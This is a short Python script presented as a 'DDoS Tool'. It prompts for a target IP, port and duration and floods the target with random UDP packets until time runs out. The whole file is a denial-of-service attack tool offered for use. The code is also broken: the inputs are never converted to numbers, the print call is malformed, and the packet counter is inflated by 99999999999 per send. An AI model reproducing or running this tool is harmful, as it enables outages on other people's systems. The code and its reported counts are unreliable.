import os
import sys
import time
import socket
import random
from time import sleep

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")
print ("\033[5;49mDDoS Tool By Nyanx306")
print (" ")
ip =input("Target IP: ")
port = input("Port: ")
dur= input("Time: ")
timeout = time.time() + dur
sent = 0

while True:
        try:
                if time.time() > timeout:
                        break
                else:
                        pass
                sock.sendto(bytes,(ip, port))
                sent = sent + 99999999999
                print("Sending %s Packets To %s Via Port %s") , sent, ip, port
        except KeyboardInterrupt:
               sys.exit()
